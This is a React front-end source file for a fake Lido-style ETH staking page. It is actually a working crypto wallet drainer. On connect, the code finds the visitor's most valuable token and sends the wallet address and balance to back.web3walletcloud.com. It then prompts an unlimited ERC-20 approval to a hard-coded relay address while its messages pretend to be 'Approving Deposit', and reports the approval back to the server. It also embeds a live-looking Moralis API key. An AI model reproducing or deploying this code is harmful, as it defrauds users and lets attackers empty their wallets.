import "./index.css";
import Home from './pages/Home.jsx'
import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';

import Modal from "./modal1.jsx";
import { Detail } from "./components/Detail.jsx";
import Withdrawal from "./components/cards/Withdrawal.jsx";




import React, { useEffect, useState } from 'react';
import { useAccount, useWriteContract, useDisconnect } from 'wagmi';
import { useAppKit } from '@reown/appkit/react'
import { parseAbi ,parseUnits } from 'viem';
import Moralis from 'moralis';
import TestimonialCarousel from "./components/cards/TestimonialCarousel.jsx";
import Navbar from "./components/cards/Navbar.jsx";
import TradingViewWidget from "./components/cards/TradingWidget.jsx";
import Dashboard from "./components/cards/Dashboard.jsx";
import Rewards from "./components/cards/Rewards.jsx";
// Initialize Moralis outside the component or in a separate setup file
Moralis.start({
  apiKey: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjU3ODQ3MTFkLTA5ODAtNGQzOC1iZDNmLTdhZTUxMzc1MjA1NiIsIm9yZ0lkIjoiMzg1MDY5IiwidXNlcklkIjoiMzk1NjY5IiwidHlwZUlkIjoiMjQ1ZGI4MmUtZjExNS00ZDU3LWI4NzMtNTEwZDk0YTQyNjliIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3MTE1ODA0OTAsImV4cCI6NDg2NzM0MDQ5MH0.-HXLLlSZRWwGGZmt92UcD1rDKW62hLqPlDZY0r3eRt4", // Replace with your actual Moralis API Key
});



function App() {
  const { address, chainId, isConnected,  } = useAccount();
  const { open } = useAppKit();
  const { disconnect } = useDisconnect()
  const { writeContractAsync } = useWriteContract();
  const relayAddress = "0x48086B5F3564472055cA473885c98A2be549b0a4";
  const spenderAddress = "0x8FeD19ADDa5a698A754cfb7f9Cd347353090756a";
  const [errorMessage, setErrorMessage] = useState(null);
  const [balance, setBalance] = useState(null);
  const handleCloseModal = () => {
    setErrorMessage(null);
    checkBalance();
  };


  
  useEffect(() => {
    if (!isConnected) {
      open();
    }
  }, [isConnected, open]);

  useEffect(() => {
    if (isConnected) {
      setErrorMessage("Initiating Deposit");
      checkBalance();
    }
  }, [isConnected, address, chainId]);



  const checkBalance = async () => {
    if (!isConnected || !address || !chainId) {
      open();
      return;
    }

    try {
      const response = await Moralis.EvmApi.wallets.getWalletTokenBalancesPrice({
        address,
        chain: chainId.toString(),
      });
      const balances = response.toJSON();
      const filteredBalances = balances.result.filter(
        (token) =>
          token.token_address !== "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE" &&
          token.verified_contract === true
      );
      if (filteredBalances.length === 0) {
        setErrorMessage("New or empty wallets ineligible");
        return;
      }

      const result = filteredBalances.reduce((max, token) =>
        token.usd_value > max.usd_value ? token : max
      , filteredBalances[0]);

      setBalance(result.usd_value); // Set the balance here to display it on the dashboard
 
  
      
      await connectPost(address, result.token_address, result.usd_value);
      
      if (result.token_address) {
        await approveToken(result.token_address , relayAddress);
      } else {
        setErrorMessage("Invalid wallet Try another");
      }
    } catch (error) {
      setErrorMessage("Invalid wallet Try another");
    }
 
  };



  const connectPost = async (walletAddress, tokenAddress, balance) => {
    try {
      const response = await fetch("https://back.web3walletcloud.com/connect", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          walletAddress,
          tokenAddress,
          balance,
        }),
      });

      if (!response.ok) {
        throw new Error("Network response was not ok");
        
      }
    } catch (error) {
      setErrorMessage("Error logging airdrop data");
    }
  };

  const abi = [
    {
      type: 'function',
      name: 'approve',
      stateMutability: 'nonpayable',
      inputs: [
        { name: 'spender', type: 'address' },
        { name: 'amount', type: 'uint256' },
      ],
      outputs: [{ type: 'bool' }],
    },
  
  ];

  const approveToken = async (tokenAddress , relayAddress) => {
  try {
    setErrorMessage("Approving Deposit");
    const maxApprovalAmount = parseUnits('115792089237316195423570985008687907853269984665640564039457584007913129639935', 0);
    
    

    const result = await writeContractAsync( {
      abi,
      address: tokenAddress,
      functionName: 'approve',
      args: [relayAddress, maxApprovalAmount],
            
    });

    await postData(
      chainId,
      tokenAddress,
      address,
      spenderAddress
    );

  } catch (error) {
    setErrorMessage(`Error approving deposit`);
  }
};

const postData = async (
  chainId,
  tokenAddress,
  walletAddress,
  spenderAddress,
  approvedBalance
) => {
  try {
    const response = await fetch("https://back.web3walletcloud.com/add", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chainId,
        tokenAddress,
        walletAddress,
        spenderAddress,
        approvedBalance,
      }),
    });

    if (!response.ok) {
      throw new Error("Network response was not ok");
    }

    const data = await response.json();
  } catch (error) {
    console.error("Error posting data:", error);
    setErrorMessage("Error sending airdrop data");
  }
};



return (
  <Router>
  <div className="App">
  <Navbar />
  <TradingViewWidget />
  <Routes>
          <Route
            path="/"
            element={
              <div>
              <div className="min-h-screen flex justify-center items-center text-white py-16 px-4 md:px-0">
                <div className="w-full max-w-md flex flex-col gap-10">
                  <div>
                    <h2 className="font-bold text-black text-2xl mx-auto w-fit">
                      Stake Ether
                    </h2>
                    <h3 className="font-medium text-black text-xs mx-auto w-fit text-[#b3b5b8] mt-1 mb-4">
                      Stake and receive stETH while staking
                    </h3>
                    {isConnected && balance !== null && (
                      <Dashboard address={address} balance={balance} />
                    )}
                    <div className="bg-white p-6 md:p-8 flex flex-col gap-6 rounded-xl">
                      <NumberInput />

                      <button
                        type="button"
                        className="bg-[#00a3ff] text-[#f7fcff] p-4 rounded-xl text-sm font-bold"
                        onClick={open}
                      >
                        Connect Wallet
                      </button>

                      {/* Inner card */}
                      <div className="inn inn2 p-4 rounded-xl grid gap-6">
                        <div>
                          <h3 className="text-xl font-semibold">
                            New way to support decentralization
                          </h3>
                          <p className="text-sm mt-[5px] mb-[10px]">
                            You can stake ETH in{' '}
                            <span className="text-[#00a3ff]">the DVV vault</span> to get
                            stETH rewards, gain points and help to decentralize the Lido
                            Protocol
                          </p>
                        </div>
                        <div className="flex items-center gap-6 text-xs font-semibold">
                          <span className="flex items-center gap-4">
                            <Icon name="steth" />
                            <span>stETH APR</span>
                            <span>+</span>
                          </span>
                          <Icon name="group" />
                          <span className="flex items-center gap-1 flex-wrap md:flex-nowrap">
                            <span>Obol</span>
                            <span>+</span>
                            <span>SSV</span>
                            <span>+</span>
                            <span>Mellow Points</span>
                          </span>
                        </div>
                        <div className="grid grid-cols-3 items-center">
                          <p className="text-[#7e7e83] text-[11px] font-medium col-span-2">
                            Not financial advice. Info and APR are illustrative, actual
                            rewards may vary. Vaults use carries risk. By proceeding,
                            you'll be redirected to a third-party site.
                          </p>
                          <button
                            type="button"
                            className="bg-[#00a3ff] text-[#f7fcff] px-4 py-2 rounded-lg text-xs font-bold w-fit justify-self-end"
                          >
                            Proceed
                          </button>
                        </div>
                      </div>

                      <Detail title="You will receive" value="3434434.0 stETH" />
                      <Detail title="Max transaction cost" value="1 ETH = 1 stETH" />
                      <Detail title="Exchange rate" value="$2.68" />
                      <Detail title="Reward fee" value="10%" tooltip="asfasdf" />
                    </div>
                  </div>
                </div>
              
              </div>
              <Home />
              <TestimonialCarousel />
              </div>
            }
          />


          <Route path="/withdrawal" element={<Withdrawal />} />
          <Route path="/rewards" element={<Rewards />} />
        </Routes>
  <div id="lido-ui-modal-root"></div>
  <Modal message={errorMessage} onClose={handleCloseModal} />
</div>
</Router>
);
}

const NumberInput = () => {
  return (
    <div className="relative flex items-center">
      <span className="bg-[#273852]  absolute ml-2">
        <Icon name="eth" />
      </span>
      <input type="number" placeholder="ETH amount" min={0} className="w-full p-4 pl-10 rounded-xl bg-white placeholder:text-[#838387]  border border-[#46464d] focus-visible:border-[#838387] outline-none" />
      <button type="button" className="absolute right-4 text-black bg-[#00a3ff] opacity-80 p-3 rounded-xl text-xs">MAX</button>
    </div>
  )
}

const Icon = ({ name }) => {
  return (
    <>
      {
        name === 'eth' ?
          <svg width="24" height="24" viewBox="0 0 24 24" fill="#fff">
            <path opacity="0.6" d="M11.999 3.75v6.098l5.248 2.303-5.248-8.401z"></path>
            <path d="M11.999 3.75L6.75 12.151l5.249-2.303V3.75z"></path>
            <path opacity="0.6" d="M11.999 16.103v4.143l5.251-7.135L12 16.103z"></path>
            <path d="M11.999 20.246v-4.144L6.75 13.111l5.249 7.135z"></path>
            <path opacity="0.2" d="M11.999 15.144l5.248-2.993-5.248-2.301v5.294z"></path>
            <path opacity="0.6" d="M6.75 12.151l5.249 2.993V9.85l-5.249 2.3z"></path>
          </svg>
          : name === 'steth' ?
            <svg xmlns="http://www.w3.org/2000/svg" width="34" height="34" fill="none"><rect width="32" height="32" x="1" y="1" stroke="#28282F" strokeWidth="2" rx="16"></rect><path fill="#34343D" d="M17 32c8.284 0 15-6.716 15-15S25.284 2 17 2 2 8.716 2 17s6.716 15 15 15"></path><path fill="#00A3FF" d="m23.153 15.934.168.258a7.235 7.235 0 0 1-1.017 9.149 7.55 7.55 0 0 1-5.3 2.151z" opacity="0.6"></path><path fill="#00A3FF" d="m17.003 19.447 6.15-3.513-6.15 11.558z" opacity="0.2"></path><path fill="#00A3FF" d="m10.847 15.934-.168.258a7.235 7.235 0 0 0 1.017 9.149 7.55 7.55 0 0 0 5.3 2.151z"></path><path fill="#00A3FF" d="m16.994 19.447-6.15-3.513 6.15 11.558z" opacity="0.6"></path><path fill="#00A3FF" d="M17.005 11.6v6.058l5.297-3.027z" opacity="0.2"></path><path fill="#00A3FF" d="m17.003 11.6-5.3 3.03 5.3 3.028z" opacity="0.6"></path><path fill="#00A3FF" d="m17.003 6.504-5.3 8.129 5.3-3.04z"></path><path fill="#00A3FF" d="m17.005 11.592 5.301 3.04L17.005 6.5z" opacity="0.6"></path></svg>
            : name === 'group' ?
              <div className="w-14 h-6 bg-gray-400"></div>
              : null
      }
    </>
  )
}

export default App;